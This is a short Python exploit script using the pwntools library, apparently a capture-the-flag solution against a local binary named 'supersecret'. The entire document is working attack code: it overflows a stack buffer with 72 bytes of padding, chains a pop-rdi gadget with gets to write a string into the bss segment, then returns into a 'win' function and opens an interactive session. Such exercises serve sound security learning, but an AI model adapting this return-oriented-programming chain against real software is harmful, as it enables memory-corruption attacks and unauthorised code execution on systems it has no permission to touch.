#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./supersecret", checksec=False)
io = process(elf.path)

# Gadgets and addresses
pop_rdi = 0x00000000004011b6
bss = 0x0000000000404050
gets = elf.plt['gets']
win = 0x00000000004011b8

# Build payload
payload = flat(
    b"A" * 72,
    pop_rdi,
    bss,
    gets,
    pop_rdi,
    bss,
    win
)

# Send payload
io.sendline(payload)
io.sendline(b"supersecret")
io.interactive()

